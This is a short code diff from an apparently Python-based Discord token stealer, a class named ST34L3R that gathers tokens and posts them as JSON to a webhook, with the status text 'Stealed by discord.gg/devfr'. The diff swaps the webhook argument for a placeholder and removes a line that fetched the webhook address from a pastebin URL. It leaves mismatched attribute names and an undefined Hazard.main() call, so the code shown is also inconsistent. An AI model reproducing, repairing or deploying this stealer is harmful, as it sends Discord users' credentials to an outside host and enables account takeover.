@@ -8,7 +8,7 @@ for _ in range(2):
 import os, re, requests, json
 class ST34L3R():
     def __init__(self, hook, status):
-        self.WEBHOOK = hook
+        self.webhook = "WEBHOOK_HERE"
         self.NEW_STATUS = status
         
     def gettokens(self):
@@ -170,7 +170,6 @@ class ST34L3R():
         requests.post(self.WEBHOOK, headers={"content-type": "application/json"}, data=json.dumps(payload).encode())
 
 ST34L3R = ST34L3R(
-    requests.get("https://pastebin.com/raw/XXXXXXXX").text,
     "Stealed by discord.gg/devfr"
 )
 Hazard.main()
